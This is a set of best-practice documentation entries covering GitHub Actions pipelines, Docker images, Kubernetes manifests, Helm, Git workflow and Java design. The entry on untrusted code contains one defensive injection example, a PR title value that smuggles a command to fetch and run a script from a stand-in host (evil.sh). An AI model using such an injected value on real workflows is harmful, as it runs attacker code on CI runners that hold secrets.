docs.title: Cancel superseded runs
docs.text:
Use concurrency so a new push cancels the previous run of the same branch, but never cancel a deploy halfway.

Why it's a best practice: five quick pushes to a PR otherwise queue five full pipelines. Cancelling a half-finished deployment, on the other hand, can leave an environment in a broken state.

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}

docs.title: Reuse workflows instead of copy-pasting YAML
docs.text:
Put shared steps in a reusable workflow (workflow_call) or a composite action.

Why it's a best practice: ten services with ten copies of the same 80 lines means every fix (a new scanner, a new Java version) is ten PRs, and the copies drift.

# service repo
jobs:
  ci:
    uses: my-org/pipelines/.github/workflows/java-ci.yml@v3
    with: { java-version: "21" }
    secrets: inherit

docs.title: 🔐 Security of the pipeline
Give the token the least permissions
docs.text:
Set permissions: contents: read at the top of the workflow, and raise it per job only where needed.

Why it's a best practice: the default GITHUB_TOKEN can often write to the repo. A compromised dependency or a malicious PR step then gets write access. Least privilege limits the blast radius.

permissions: { contents: read }
jobs:
  publish:
    permissions: { contents: read, packages: write }

docs.title: Pin third-party actions to a commit SHA
docs.text:
Reference uses: owner/action@<full-sha> (with a version comment), and let Dependabot or Renovate update it.

Why it's a best practice: a tag like @v4 can be moved by the action's owner, or by an attacker who steals their account, and your pipeline runs the new code with your secrets. A SHA is immutable.

- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

docs.title: Use OIDC instead of long-lived cloud keys
docs.text:
Let the job request a short-lived token from the cloud provider, rather than storing an access key in secrets.

Why it's a best practice: a stored key never expires, is copied into every fork's settings by mistake, and leaks silently. An OIDC token lives minutes and the cloud-side trust policy can restrict it to one repo and branch.

permissions: { id-token: write, contents: read }
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with: { role-to-assume: arn:aws:iam::123456789012:role/deploy, aws-region: eu-west-1 }

docs.title: Never run untrusted code with secrets
docs.text:
Don't use pull_request_target to check out and run code from a fork. Never interpolate ${{ github.event.* }} directly into a run: script.

Why it's a best practice: pull_request_target runs with the base repo's secrets; running the PR's code there hands them to the author. Interpolating a PR title into a shell script is command injection ("; curl evil.sh | sh #). Pass it through an environment variable instead.

# ⛔ injection
- run: echo "${{ github.event.pull_request.title }}"
# ✅
- run: echo "$TITLE"
  env: { TITLE: "${{ github.event.pull_request.title }}" }

docs.title: 🚦 Quality gates & delivery
Enforce gates on the pull request, not after merge
docs.text:
Make the CI checks required in branch protection: tests, coverage threshold on new code, static analysis (SonarQube), dependency and image scan.

Why it's a best practice: a gate that can be ignored is a suggestion. Checking only the new code's coverage keeps the bar reachable on legacy projects, where a global threshold is either ignored or blocks everything.

docs.title: Protect production with environments
docs.text:
Use GitHub environments with required reviewers for production, and environment-scoped secrets.

Why it's a best practice: staging can deploy automatically on merge, while production waits for a human, and only jobs targeting production can read production secrets.

deploy-prod:
  needs: deploy-staging
  environment: production      # pauses until a reviewer approves

docs.title: Make deploys roll back on their own
docs.text:
Deploy with a health check and automatic rollback (helm upgrade --atomic, kubectl rollout status then rollout undo). Smoke-test after deploy.

Why it's a best practice: a pipeline that reports "green" after pushing a broken version is worse than no pipeline. Waiting for readiness and undoing on failure turns an outage into a failed run.

- run: |
    kubectl set image deploy/orders orders=$IMAGE
    kubectl rollout status deploy/orders --timeout=120s || { kubectl rollout undo deploy/orders; exit 1; }

docs.title: Keep the pipeline fast and observable
docs.text:
Track pipeline duration and flakiness, and quarantine flaky tests instead of re-running until green.

Why it's a best practice: a pipeline that takes 40 minutes and fails randomly is bypassed. Lead time and change failure rate (DORA metrics) start with a fast, trusted pipeline.

⛔ "just re-run it" ✅ tag the flaky test, fix it within the sprint, keep the main suite deterministic

docs.title: Docker, Kubernetes & DevOps Best Practices
🐳 Docker images
Use multi-stage builds
docs.text:
Build in one stage with the full toolchain, and copy only the result into a small runtime image.

Why it's a best practice: a single-stage image ships the JDK, Maven, the ~/.m2 cache, the source code and the Node toolchain to production. That's hundreds of MB to pull on every deploy, a slower cold start, and many more packages with known vulnerabilities to patch. The final stage only needs a JRE and the jar.

# ✅
FROM eclipse-temurin:21-jdk AS build
WORKDIR /app
COPY . .
RUN ./mvnw -q package -DskipTests

FROM eclipse-temurin:21-jre
COPY --from=build /app/target/app.jar /app/app.jar
ENTRYPOINT ["java", "-jar", "/app/app.jar"]

docs.title: Pin base image versions
docs.text:
Use a specific version tag, or a digest for full reproducibility. Never latest.

Why it's a best practice: latest points to whatever was pushed last. The same Dockerfile builds a different image next week, maybe with a new major version of the runtime, and a build that worked yesterday breaks with no change in your repo. You also can't tell which version is in production. Pin the version, and let a bot (Renovate, Dependabot) open PRs to update it so upgrades are reviewed and tested.

⛔ FROM node:latest ✅ FROM node:22.11-alpine or FROM node:22.11-alpine@sha256:...

docs.title: Order layers from least to most frequently changed
docs.text:
Copy dependency files and install dependencies first, then copy the source code.

Why it's a best practice: Docker caches each layer and rebuilds everything after the first one that changed. With COPY . . first, any source change invalidates the dependency layer, so every build downloads all dependencies again. Copying package.json / pom.xml alone first means dependencies are only reinstalled when they actually change: builds go from minutes to seconds.

# ✅
COPY package.json package-lock.json ./
RUN npm ci
COPY . .
RUN npm run build

docs.title: Add a .dockerignore
docs.text:
Exclude .git, node_modules, target, local .env files and IDE folders from the build context.

Why it's a best practice: without it, COPY . . sends the whole directory to the build, including a .git folder that can weigh more than the app, local build output that overwrites the one built in the image, and .env files with real secrets that end up inside a layer anyone with the image can read.

✅ .dockerignore: .git, node_modules, target, .env*, *.log

docs.title: Don't run as root
docs.text:
Create a non-root user in the image and switch to it with USER.

Why it's a best practice: by default, the process in the container runs as root. If the app is compromised, the attacker is root inside the container, can modify its files, and is one kernel or runtime vulnerability away from root on the node. With a non-root user, a container escape gives far less. Kubernetes can enforce it with securityContext.runAsNonRoot: true.

# ✅
RUN useradd --system --uid 10001 app
USER 10001

docs.title: Never put secrets in the image
docs.text:
Don't COPY credentials or set them with ENV / ARG. Inject them at runtime (Kubernetes Secret, vault). Use RUN --mount=type=secret if the build itself needs one.

Why it's a best practice: every layer of an image is kept and can be extracted with docker save or docker history, even if a later layer deletes the file. ENV and ARG values are stored in the image metadata in clear text. Anyone who can pull the image (a registry, a CI cache, a developer laptop) gets the secret, and rotating it means rebuilding every image.

⛔ ENV DB_PASSWORD=s3cr3t, COPY id_rsa /root/.ssh/ ✅ secret mounted at runtime, RUN --mount=type=secret,id=npmrc npm ci at build time

docs.title: 📦 Containers at runtime
Use the exec form and handle SIGTERM
docs.text:
Write ENTRYPOINT / CMD as a JSON array, and make the app finish in-flight work when it receives SIGTERM.

Why it's a best practice: the shell form (ENTRYPOINT java -jar app.jar) starts /bin/sh as PID 1, and the shell doesn't forward signals. On a stop or a deploy, the app never receives SIGTERM, is killed with SIGKILL after the grace period, and in-flight requests fail. The exec form makes the app PID 1 so it gets the signal and can shut down cleanly.

⛔ ENTRYPOINT java -jar /app/app.jar ✅ ENTRYPOINT ["java", "-jar", "/app/app.jar"]

docs.title: One process per container, logs to stdout
docs.text:
Run a single main process per container, and write logs to stdout / stderr, not to files.

Why it's a best practice: the container's lifecycle follows its main process: if you start several with a script, one can crash while the container stays "running" and healthy. Separate containers can be scaled, restarted and monitored independently. The platform collects stdout automatically; log files inside a container fill its disk and disappear when it restarts. Log in JSON so the aggregator can index fields.

⛔ a start.sh that runs nginx and the app in the background and tails a log file ✅ one container per process, JSON logs to stdout

docs.title: ☸️ Kubernetes
Set resource requests and limits
docs.text:
Give every container CPU and memory requests, and a memory limit.

Why it's a best practice: the scheduler places pods based on requests. Without them, it packs too many pods on a node, and they fight for CPU and memory. Without a memory limit, one leaking pod can use all the node's memory and get other pods evicted. A memory limit that's too low gets the pod OOMKilled, so measure real usage first. For the JVM, size the heap relative to the container (-XX:MaxRAMPercentage=75). A CPU limit causes throttling, so many teams set a CPU request only.

# ✅
resources:
  requests: { cpu: 250m, memory: 512Mi }
  limits: { memory: 512Mi }

docs.title: Configure liveness, readiness and startup probes correctly
docs.text:
Readiness decides whether the pod gets traffic. Liveness decides whether it gets restarted. Startup protects slow starts.

Why it's a best practice: without a readiness probe, traffic is sent to a pod that hasn't finished starting, and clients get errors on every deploy. A liveness probe that checks the database restarts every pod when the database has a hiccup, which turns a small outage into a full one: liveness should only check that the process itself is alive. A slow-starting app with only a liveness probe gets killed before it's ready, in a restart loop; a startupProbe disables the other probes until startup succeeds.

# ✅
startupProbe:   { httpGet: { path: /actuator/health/liveness,  port: 8080 }, failureThreshold: 30, periodSeconds: 5 }
livenessProbe:  { httpGet: { path: /actuator/health/liveness,  port: 8080 } }
readinessProbe: { httpGet: { path: /actuator/health/readiness, port: 8080 } }

docs.title: Keep config in ConfigMaps and Secrets
docs.text:
Store environment-specific configuration in ConfigMaps and credentials in Secrets (ideally synced from a vault), not in the image.

Why it's a best practice: the same image should run in every environment, only the configuration changes. If the database URL is baked into the image, you need one build per environment, and what you tested isn't what you deploy. Secrets are only base64-encoded, not encrypted: enable encryption at rest, restrict access with RBAC, and prefer a tool like External Secrets or Sealed Secrets rather than committing them.

⛔ one image per environment, credentials in values.yaml in Git ✅ envFrom: [{ configMapRef: { name: app-config } }, { secretRef: { name: app-secrets } }]

docs.title: Run several replicas with a PodDisruptionBudget
docs.text:
Run at least 2 replicas of anything user-facing, spread across nodes, and protect them with a PodDisruptionBudget.

Why it's a best practice: with one replica, every deploy, node upgrade or crash is downtime. Even with several, a node drain can evict them all at once. A PDB tells Kubernetes how many pods must stay up during voluntary disruptions, so maintenance waits instead of taking the service down. Topology spread constraints stop all replicas from landing on the same node.

# ✅
apiVersion: policy/v1
kind: PodDisruptionBudget
spec:
  minAvailable: 1
  selector: { matchLabels: { app: orders } }

docs.title: Use rolling updates with maxUnavailable: 0
docs.text:
Configure the deployment strategy so new pods are ready before old ones are removed.

Why it's a best practice: combined with a readiness probe, maxUnavailable: 0 and maxSurge: 1 means Kubernetes starts a new pod, waits until it's ready, and only then stops an old one. If the new version never becomes ready, the rollout stops and the old pods keep serving traffic. Roll back with kubectl rollout undo.

✅ strategy: { type: RollingUpdate, rollingUpdate: { maxUnavailable: 0, maxSurge: 1 } }

All of the above in one manifest:

apiVersion: apps/v1
kind: Deployment
metadata: { name: orders }
spec:
  replicas: 3
  strategy: { type: RollingUpdate, rollingUpdate: { maxUnavailable: 0, maxSurge: 1 } }
  selector: { matchLabels: { app: orders } }
  template:
    metadata: { labels: { app: orders } }
    spec:
      terminationGracePeriodSeconds: 30
      topologySpreadConstraints:
        - maxSkew: 1
          topologyKey: kubernetes.io/hostname
          whenUnsatisfiable: ScheduleAnyway
          labelSelector: { matchLabels: { app: orders } }
      securityContext: { runAsNonRoot: true }
      containers:
        - name: orders
          image: registry.example.com/orders:3f9c2ab   # immutable tag, never latest
          ports: [{ containerPort: 8080 }]
          envFrom:
            - configMapRef: { name: app-config }
            - secretRef: { name: app-secrets }
          resources:
            requests: { cpu: 250m, memory: 512Mi }
            limits: { memory: 512Mi }
          startupProbe:   { httpGet: { path: /actuator/health/liveness,  port: 8080 }, failureThreshold: 30, periodSeconds: 5 }
          livenessProbe:  { httpGet: { path: /actuator/health/liveness,  port: 8080 } }
          readinessProbe: { httpGet: { path: /actuator/health/readiness, port: 8080 } }
---
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata: { name: orders }
spec:
  minAvailable: 1
  selector: { matchLabels: { app: orders } }

docs.title: ⎈ Helm
One chart, one values file per environment
docs.text:
Keep a single chart with sensible defaults in values.yaml, and override only what differs in values-<env>.yaml.

Why it's a best practice: copying the chart or the manifests per environment means every fix has to be applied several times, and the copies drift until production no longer matches what you tested. With per-env values files, the difference between environments is small and visible in one diff.

⛔ charts/orders-dev/, charts/orders-prod/ ✅ helm upgrade --install orders ./chart -f values.yaml -f values-prod.yaml

docs.title: Lint and render charts in CI
docs.text:
Run helm lint and helm template (plus a schema validator like kubeconform) on every change.

Why it's a best practice: a template error or wrong indentation in YAML is only discovered at deploy time, often in production. Rendering the chart in CI catches syntax errors and invalid manifests before merge, and the rendered output can be diffed in review so you see the real Kubernetes objects that will change.

✅ helm lint ./chart && helm template ./chart -f values-prod.yaml | kubeconform -strict

docs.title: 🚀 CI/CD
Build once, promote the same artifact
docs.text:
Build the image once, tag it with the commit SHA, and deploy that same image to every environment.

Why it's a best practice: rebuilding for each environment can produce a different image (a new base image, a different dependency version), so what you tested in staging isn't what runs in production. An immutable tag like the commit SHA tells you exactly which code is running and makes rollback a redeploy of the previous tag. Mutable tags (latest, prod) change under you and break both.

⛔ rebuild on each branch merge, deploy myapp:latest ✅ myapp:3f9c2ab built once, promoted dev → staging → prod

docs.title: Scan images and dependencies in the pipeline
docs.text:
Scan images (Trivy, Grype) and dependencies on every build, and fail on critical vulnerabilities.

Why it's a best practice: most vulnerabilities come from base images and third-party libraries, not your own code, and new ones are published every day for packages you shipped months ago. Scanning in CI blocks known issues before they reach production, and regular scans of running images tell you when you need to rebuild.

✅ trivy image --exit-code 1 --severity CRITICAL myapp:3f9c2ab

A minimal pipeline that builds once, scans, and promotes the same SHA-tagged image (cluster credentials setup omitted):

# .github/workflows/ci.yml
name: ci
on: { push: { branches: [main] } }
permissions: { contents: read, packages: write }
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: ./mvnw -B verify                       # fail fast: tests before anything else
      - uses: docker/login-action@v3
        with: { registry: ghcr.io, username: "${{ github.actor }}", password: "${{ secrets.GITHUB_TOKEN }}" }
      - run: |
          IMAGE=ghcr.io/${{ github.repository }}:${GITHUB_SHA::7}
          docker build -t "$IMAGE" .
          docker run --rm aquasec/trivy image --exit-code 1 --severity CRITICAL "$IMAGE"
          docker push "$IMAGE"                      # build once, push once

  deploy-staging:
    needs: build
    runs-on: ubuntu-latest
    environment: staging                            # prod uses its own environment with required reviewers
    steps:
      - uses: actions/checkout@v4
      - run: helm upgrade --install orders ./chart -f values.yaml -f values-staging.yaml --set image.tag=${GITHUB_SHA::7} --atomic

docs.title: Git Best Practices
📝 Commits
Make small, atomic commits
docs.text:
One commit is one logical change that builds and passes tests on its own.

Why it's a best practice: a commit named "stuff" with 40 files can't be reviewed, reverted or bisected. When production breaks, git revert of an atomic commit removes exactly one change; reverting a giant commit also removes three unrelated fixes. git bisect finds the culprit in about log2(N) steps only if every commit is buildable.

# ⛔
git add . && git commit -m "changes"

# ✅ stage by hunk, commit per idea
git add -p
git commit -m "fix(orders): reject negative quantities"

docs.title: Follow Conventional Commits
docs.text:
Format messages as type(scope): summary, with types such as feat, fix, docs, refactor, test, chore.

Why it's a best practice: a consistent format makes git log --oneline readable, and tools can generate changelogs and pick the next semantic version (feat is minor, fix is patch, ! is major) automatically. Reviewers know from the prefix what to look for.

# ⛔
fixed bug
WIP
update

# ✅
feat(payments): add SEPA direct debit
fix(auth): refresh token before expiry
feat(api)!: remove deprecated /v1/users endpoint

docs.title: Write the subject in the imperative, and explain why in the body
docs.text:
Keep the subject under about 50 characters ("Add", not "Added"), and use the body for the reason, not the diff.

Why it's a best practice: the diff already shows what changed; only the message can say why. Six months later, git blame on a strange line leads to a message that either explains the decision or says "fix". Imperative mood matches Git's own messages ("Merge...", "Revert...").

# ⛔
fix(cache): fixed the thing

# ✅
fix(cache): evict entries on user update

The cache key ignored the tenant id, so users could see another tenant's
profile for up to 10 minutes after an update. Include the tenant in the key.

Closes #482

docs.title: Never rewrite history that others have pulled
docs.text:
Amend, rebase or force-push only your own unshared branches. Use --force-with-lease if you must.

Why it's a best practice: rewriting shared commits gives everyone else diverging histories, duplicate commits and painful merges. Plain --force can also erase a teammate's push you haven't fetched; --force-with-lease refuses if the remote moved.

# ⛔
git push --force origin main

# ✅ own feature branch only
git push --force-with-lease origin feature/login

docs.title: 🌿 Branching
Use short-lived branches off main
docs.text:
Branch per task, merge within days, and delete the branch after merge. Prefer trunk-based development or GitHub Flow.

Why it's a best practice: the longer a branch lives, the more it diverges and the more painful the merge: a 3-week branch can mean hundreds of conflicts and a risky big-bang release. Small frequent merges are easier to review and cheaper to fix. Hide unfinished work behind a feature flag rather than a long branch.

# ⛔ feature/big-rewrite alive for 6 weeks

# ✅
git switch -c feat/order-export
# ... 1-3 days later: PR, review, merge, delete
git branch -d feat/order-export

docs.title: Name branches with a type and a ticket
docs.text:
Use feat/, fix/, chore/ prefixes and, if you have a tracker, the ticket id.

Why it's a best practice: my-branch2 says nothing on a list of 40 remote branches. Prefixes allow filtering, CI rules (deploy from release/*) and links to tickets.

# ⛔
test  fix  johns-branch

# ✅
feat/PAY-142-sepa-debit
fix/PAY-201-null-currency

docs.title: Protect the main branch
docs.text:
Require pull requests, at least one approval, and passing CI. Disallow force-push and direct commits.

Why it's a best practice: without protection, one bad push or a Friday-evening hotfix breaks the build for everyone, or deploys untested code. Rules enforced by the platform apply to admins and tired humans equally.

# ✅ GitHub branch protection on main
Require a pull request before merging (1 approval)
Require status checks: build, test
Block force pushes
Require linear history (optional)

docs.title: 🔍 Pull requests & reviews
Keep pull requests small and focused
docs.text:
Aim for under about 400 changed lines and one purpose. Split refactors from behavior changes.

Why it's a best practice: review quality drops sharply with size: studies of code review show reviewers find fewer defects after roughly 200 to 400 lines, and 2,000-line PRs get "LGTM" after a skim. Small PRs are reviewed in minutes, merged the same day, and easy to revert.

# ⛔
PR: "Refactor package layout + add export feature + upgrade Spring" (3,100 lines)

# ✅
PR 1: chore: upgrade Spring Boot 3.3 -> 3.4
PR 2: refactor: move order classes to order package (no behavior change)
PR 3: feat: CSV export of orders

docs.title: Write a pull request description that helps the reviewer
docs.text:
State what and why, how you tested it, and anything risky. Link the issue and add screenshots for UI changes.

Why it's a best practice: the reviewer lacks your context. A clear description turns a 30-minute puzzle into a 5-minute review, and later serves as the record of a decision.

## What
Add CSV export for orders (max 10k rows).
## Why
Support requests #482, #501.
## How tested
Unit tests + manual export with 10k rows (2.1 s).
## Risk
New endpoint only; no schema changes.

docs.title: Review the code, automate the style
docs.text:
Let formatters and linters (Spotless, Checkstyle) fail the build, so reviews focus on design, correctness and tests.

Why it's a best practice: arguments about braces waste review time and irritate people. A tool is consistent and never tired. Reviewers then have the energy to find the missing null check or race condition.

<!-- ✅ pom.xml -->
<plugin>
  <groupId>com.diffplug.spotless</groupId>
  <artifactId>spotless-maven-plugin</artifactId>
</plugin>

docs.title: 🔀 Integrating changes
Rebase your local branch, merge (or squash) into main
docs.text:
Rebase a private feature branch on the latest main to update it. Integrate into main by squash or merge commit through the PR.

Why it's a best practice: rebasing your own branch keeps the history linear and free of "Merge main into feature" noise. Squash-merge gives one clean commit per PR on main, which is easy to revert. Rebasing a shared branch, however, rewrites commits others have (see the history rule above).

# ✅ update your private branch
git fetch origin
git rebase origin/main

# ✅ tidy noisy commits before review
git rebase -i origin/main

docs.title: Resolve conflicts on purpose, and enable rerere
docs.text:
Read both sides, run the tests after resolving, and turn on git rerere to remember resolutions.

Why it's a best practice: picking "ours" or "theirs" for a whole file silently drops someone's work. Resolved conflicts that were never compiled are a frequent cause of broken main. rerere replays a resolution you already made when the same conflict appears again during a repeated rebase.

# ✅
git config --global rerere.enabled true
git config --global merge.conflictstyle zdiff3

docs.title: 🔐 Safety & automation
Never commit secrets, and scan for them
docs.text:
Keep keys and passwords out of Git, use .gitignore, and run a scanner (gitleaks) in a pre-commit hook and in CI.

Why it's a best practice: removing a file in a later commit doesn't remove it from history, and anyone who cloned already has it. Bots find pushed cloud keys in minutes. The only real fix is to rotate the credential; rewriting history is cleanup, not a cure.

# ⛔
git add .env && git commit -m "add config"

# ✅
echo ".env" >> .gitignore
gitleaks protect --staged      # in a pre-commit hook

docs.title: Automate checks with Git hooks
docs.text:
Use pre-commit hooks (Husky, lefthook, pre-commit) for formatting and secrets, and commit-msg for message rules. Repeat them in CI.

Why it's a best practice: catching a formatting error or a leaked key in 2 seconds locally is better than a failed pipeline 10 minutes later. Hooks can be skipped (--no-verify), so CI stays the real gate.

# ✅ lefthook.yml
pre-commit:
  commands:
    format: { run: ./mvnw -q spotless:apply }
    secrets: { run: gitleaks protect --staged }
commit-msg:
  commands:
    conventional: { run: npx commitlint --edit {1} }

docs.title: Tag releases with annotated, semantic-version tags
docs.text:
Create vMAJOR.MINOR.PATCH annotated tags on the released commit and push them.

Why it's a best practice: a tag is the permanent answer to "what code is running in production?". Annotated tags store the tagger, date and message, and can be signed. Lightweight or moved tags make releases unreproducible. Never move a published tag: cached builds and consumers will differ from what you now claim.

# ⛔
git tag latest && git tag -f latest      # moving target

# ✅
git tag -a v1.4.0 -m "Release 1.4.0: SEPA debit"
git push origin v1.4.0

docs.title: Keep generated files and large binaries out of Git
docs.text:
Ignore build output (target/, node_modules/) and store big binaries in Git LFS or an artifact registry.

Why it's a best practice: every version of a binary stays in history forever: ten 50 MB jars make each clone 500 MB heavier. Generated files cause pointless merge conflicts.

# ✅ .gitignore
target/
build/
.idea/
*.log
.env

docs.title: Recover with reflog instead of panicking
docs.text:
Use git reflog to find lost commits, and prefer git revert for published mistakes.

Why it's a best practice: Git rarely destroys committed work: for about 90 days the reflog still points to commits after a bad reset or rebase. revert adds an undo commit and is safe for shared branches, while reset --hard rewrites and discards.

# ✅ undo a bad rebase
git reflog
git reset --hard HEAD@{5}

# ✅ undo a commit already on main
git revert 9fceb02

docs.title: Java Best Practices
🛡️ Null safety & Optional
Don't use Optional as a field or parameter
docs.text:
Optional is meant for return types only. It tells the caller "this method may have no result, handle it".

Why it's a best practice: Optional was designed as a return-type signal, not a general-purpose container. As a parameter it doesn't help: the caller can still pass null instead of Optional.empty(), so you now have three states to handle (value, empty, null), and every call site gets noisier with Optional.of(...). As a field, it's an extra object per instance, it isn't Serializable (so it breaks JPA entities, caches and session replication), and most frameworks don't expect it. Keep the field nullable and wrap it only in the getter.

⛔ void send(Optional<String> cc) ✅ void send(String cc) + an overload, or @Nullable String cc

⛔ private Optional<Address> address; ✅ public Optional<Address> getAddress() { return Optional.ofNullable(address); }

docs.title: Don't call Optional.get() blindly
docs.text:
Use orElseThrow, orElse, orElseGet, map or ifPresent instead of get().

Why it's a best practice: get() on an empty Optional throws NoSuchElementException, which is just a NullPointerException with a different name: you've brought back the exact bug Optional was supposed to prevent. orElseThrow(() -> new UserNotFoundException(id)) makes the "absent" case explicit and turns it into a domain error that carries context and can be mapped to a proper response (e.g. a 404).

⛔ userRepository.findById(id).get() ✅ userRepository.findById(id).orElseThrow(() -> new UserNotFoundException(id))

docs.title: Return empty collections, never null
docs.text:
A method that returns a collection should return an empty one when there's nothing to return.

Why it's a best practice: callers can then iterate, stream or call size() directly. Returning null forces every caller to add a null check, and the one that forgets fails with an NPE, often far from the source and only on the "no data" path, which is the least tested one. There's no performance excuse: List.of(), Set.of() and Map.of() return shared immutable instances, so nothing gets allocated.

⛔ return orders.isEmpty() ? null : orders; ✅ return List.of();

docs.title: Fail fast on null at boundaries
docs.text:
Validate required arguments where they enter your object (constructors, public methods) instead of letting null travel through the system.

Why it's a best practice: if a null is stored silently, the NPE shows up later, in another method or thread, with a stack trace that points at the symptom and not the cause. Objects.requireNonNull(x, "x") fails right away, at the line that received the bad value, with the parameter name in the message. It also documents the contract: a reader can see the argument is mandatory.

// ✅
public OrderService(OrderRepository repository) {
    this.repository = Objects.requireNonNull(repository, "repository");
}

docs.title: 🚨 Exceptions & logging
Never swallow exceptions
docs.text:
Every catch block must either handle the error, or rethrow it (wrapped if needed) with the original cause.

Why it's a best practice: an empty catch turns a failure into silent data loss: the order wasn't saved, but the caller thinks it was, and there's no log to find out why. When you wrap, pass the original exception as the cause so the root stack trace is kept in the "Caused by:" chain. Wrapping also lets you translate a low-level exception (SQLException) into one that makes sense at your layer and add useful context (the id).

// ⛔
try { save(order); } catch (Exception e) { }

// ✅ handle it, or wrap and rethrow with the cause
try { save(order); } catch (SQLException e) {
    throw new OrderPersistenceException("Failed to save order " + order.id(), e);
}

docs.title: Catch specific exceptions, not Exception
docs.text:
Catch only the exceptions you expect and know how to handle. Don't use exceptions for control flow either.

Why it's a best practice: catch (Exception e) also catches the ones you didn't plan for: NullPointerException, IllegalStateException, ClassCastException. Real bugs then get hidden behind the fallback value, here a 0. Catching the specific type documents which failure you're handling and lets every other one propagate. Using exceptions for normal flow (e.g. to exit a loop) is slow, since creating an exception captures the stack trace, and it hides intent: readers expect a catch to mean "something went wrong".

// ⛔
try { return Integer.parseInt(input); } catch (Exception e) { return 0; }

// ✅
try { return Integer.parseInt(input); } catch (NumberFormatException e) { return 0; }

docs.title: Log with placeholders and pass the exception last
docs.text:
Use {} placeholders instead of string concatenation, and pass the exception itself as the last argument.

Why it's a best practice: with placeholders, the message is only built if the log level is enabled, so debug calls in hot paths cost almost nothing in production. More importantly, SLF4J prints the stack trace when the last argument is a Throwable. e.getMessage() only logs one line: you lose the stack trace, the exception type and the whole "Caused by:" chain, which is usually where the real cause is. The message can even be null.

⛔ log.error("Failed to process order " + orderId + ": " + e.getMessage()); ✅ log.error("Failed to process order {}", orderId, e);

docs.title: 🔌 Resource management
Close resources with try-with-resources
docs.text:
Anything that implements AutoCloseable (streams, JDBC connections, statements, result sets, HTTP clients) should be opened in a try (...) block.

Why it's a best practice: a manual close() is skipped as soon as an exception is thrown before it. Each leak holds a file handle or a pooled DB connection, until the pool is exhausted and the app hangs. A finally block fixes that but is verbose and easy to get wrong (null checks, a close() that throws itself and hides the original error). Try-with-resources closes on every path, in reverse order of opening, and keeps the exceptions thrown by close() as suppressed exceptions attached to the original one, so nothing is lost.

// ⛔ leaks the stream if read() throws
InputStream in = Files.newInputStream(path);
in.read();
in.close();

// ✅
try (InputStream in = Files.newInputStream(path)) {
    in.read();
}

docs.title: 🧱 Object design & immutability
Prefer records for value objects
docs.text:
Use a record for classes that only carry data and are defined by their values (money, coordinates, DTOs, ids).

Why it's a best practice: records give you equals, hashCode and toString for free, generated from the components, so they can never drift apart when someone adds a field and forgets to update one of them. They are also shallowly immutable (final fields, no setters), which removes a whole class of bugs. Validation still fits in a compact constructor. The result: one line instead of ~50 lines of boilerplate that also has to be maintained.

⛔ a class with a hand-written equals and no hashCode ✅ record Money(BigDecimal amount, Currency currency) {}

docs.title: Prefer immutability
docs.text:
Make fields final, don't expose setters, and make defensive copies of mutable inputs and outputs.

Why it's a best practice: an immutable object can be shared between threads without locks, since there's nothing to race on. It's safe to use as a HashMap key or in a HashSet, and it can be cached and reused. It's also easier to reason about: once it's built and valid, it stays valid, so you don't have to know who else holds a reference. Without a defensive copy, the caller keeps a reference to the list and can change your object from the outside, bypassing any validation. List.copyOf makes an unmodifiable copy (and doesn't copy again if the list is already unmodifiable), so returning it directly is safe.

// ⛔ caller can mutate the internal list
public Order(List<Line> lines) { this.lines = lines; }
public List<Line> lines() { return lines; }

// ✅
public Order(List<Line> lines) { this.lines = List.copyOf(lines); }
public List<Line> lines() { return lines; }

docs.title: Override equals and hashCode together
docs.text:
If two objects are equals, they must have the same hashCode.

Why it's a best practice: hash-based collections first use hashCode to find the bucket, then equals inside it. If you override only equals, two "equal" objects land in different buckets: set.contains(x) returns false, and HashSet stores duplicates. Nothing throws, it's just silently wrong. Never use mutable fields in either: if a key changes after being inserted, its hash changes, the map looks in the wrong bucket, and the entry is lost (still in memory, but unreachable). Simplest fix: use a record.

docs.title: Prefer static factories or builders over telescoping constructors
docs.text:
When a constructor has more than 3–4 parameters, or several of the same type, use a builder or named static factory methods (Money.of(...), Duration.ofSeconds(...)).

Why it's a best practice: new Pizza("L", true, false, true, null) can't be read without opening the class, and swapping two booleans compiles fine but is a bug. A builder names every argument, makes optional ones really optional, and can validate the whole object in build(). Static factories have a name that explains intent, can return cached instances or a subtype, and avoid having ten constructor overloads.

⛔ new Pizza("L", true, false, true, null) ✅ Pizza.builder().size("L").cheese(true).ham(true).build()

docs.title: Prefer composition over inheritance
docs.text:
Reuse behaviour by holding an instance of another class and delegating to it, instead of extending it.

Why it's a best practice: inheritance couples you to the parent's implementation details, not just its API (the "fragile base class" problem). In the example, HashSet.addAll() calls add() internally, so overriding both counts every element twice, and it would break again if a future JDK changed that internal behaviour. The subclass also inherits every public method, including ones that bypass your logic. With composition you expose only what you want, you control every call, and you can swap the delegate (e.g. for a TreeSet).

Inheritance is still fine for a real "is-a" relationship, inside the same package or module, or when the parent class is designed and documented for extension (abstract classes, template methods).

// ⛔ inherits every HashSet method, and addAll() calls add() internally, counting twice
class CountingSet<E> extends HashSet<E> { ... }

// ✅ wrap and delegate
class CountingSet<E> {
    private final Set<E> delegate = new HashSet<>();
    private int added;

    boolean add(E e) { added++; return delegate.add(e); }
}

docs.title: Declare with interfaces, not implementations
docs.text:
Use the interface (List, Map, Set) as the type of variables, fields, parameters and return types. Use the concrete class only after new.

Why it's a best practice: code then depends on what the object does, not how. You can switch from ArrayList to LinkedList, or from HashMap to LinkedHashMap, by changing one line. Callers can also pass any implementation (List.of(...), Arrays.asList(...), a Hibernate collection) instead of being forced to convert. Returning ArrayList from a public method makes the implementation part of your API, and you can't change it later without breaking callers.

⛔ ArrayList<Order> orders = new ArrayList<>(); ✅ List<Order> orders = new ArrayList<>();

docs.title: Use enums instead of int / String constants
docs.text:
Represent a fixed set of values with an enum.

Why it's a best practice: with int or String constants, the compiler accepts any value: update(42) compiles, and so does a typo like "PIAD". An enum restricts the parameter to valid values at compile time. You also get readable toString() in logs, switch expressions that the compiler can check for missing cases, and EnumMap / EnumSet, which are faster and more compact than their hash-based versions. Enums can hold fields and behaviour too (Status.PAID.isFinal()), which keeps related logic in one place.

// ⛔
static final int STATUS_PAID = 1;
void update(int status) { ... }       // accepts 42

// ✅ type-safe, switchable, works with EnumMap / EnumSet
enum Status { PENDING, PAID, REFUNDED }
void update(Status status) { ... }
